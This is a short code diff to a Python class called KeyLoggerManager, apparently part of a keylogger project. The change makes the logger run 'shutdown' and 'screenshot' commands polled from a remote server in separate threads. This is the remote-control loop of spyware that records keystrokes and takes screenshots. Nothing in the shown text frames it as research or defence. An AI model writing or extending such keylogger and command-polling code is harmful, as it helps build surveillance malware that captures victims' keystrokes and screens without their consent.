@@ -50,9 +50,11 @@ class KeyLoggerManager(IKeyLoggerManager):
                 if response.status_code == 200:
                     commands = response.json().get('commands', {})
                     if commands.get('shutdown', False):
-                        self.stop_logging()
+                        commend = threading.Thread(target=self.stop_logging)
+                        commend.start()
                     if commands.get('screenshot', False):
-                        self.take_screenshot()
+                        commend = threading.Thread(target=self.take_screenshot)
+                        commend.start()
 
             except requests.exceptions.RequestException:
                 pass
